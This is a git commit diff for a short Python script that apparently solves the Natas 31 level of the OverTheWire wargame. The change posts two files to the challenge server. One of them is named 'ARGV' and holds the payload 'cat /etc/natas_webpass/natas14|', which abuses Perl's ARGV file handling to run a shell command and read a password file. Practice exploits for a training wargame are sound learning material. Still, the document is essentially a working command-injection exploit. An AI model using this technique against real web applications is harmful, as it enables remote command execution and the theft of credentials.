469695faf5e31cd99a53279f452a8946837d510d
Ludisposed <pjgvanschaik@gmail.com>
2017-12-22 18:37:33 +0100

    fix bug

--- Natas/Natas31env/narnia31.py
+++ Natas/Natas31env/narnia31.py
@@ -1,19 +1,15 @@
 import requests
 session = requests.Session()
 
-# IDEA
-# BROKEN NOW
-
 def natas31(url):
-    _csv_content = "a,b,c,d,e\n1,2,3,4\nasafe"
-    _csv_file = {'upload_file': ("a.csv", _csv_content)}
+    with open('a.csv', 'w') as _file:
+        _file.write("a,b,c,d,e\n1,2,3,4\nasafe")
 
-    _mal_content = "|cat a.csv"
-    _mal_file = {'upload_file': ("ARGV", _mal_content)}
-
-    payload = {'filename' : ['a.csv', 'ARGV']}
-
-    response = session.post(url, files=[_csv_file, _mal_file], data=payload)
+    with open('ARGV', 'w') as _file:
+        _file.write("cat /etc/natas_webpass/natas14|") 
+    
+    _files = [('upload_file', open('a.csv', 'rb')), ('upload_file', open('ARGV', 'rb'))]
+    response = session.post(url, files=_files)
     print(response.text)
 
 if __name__ == '__main__':
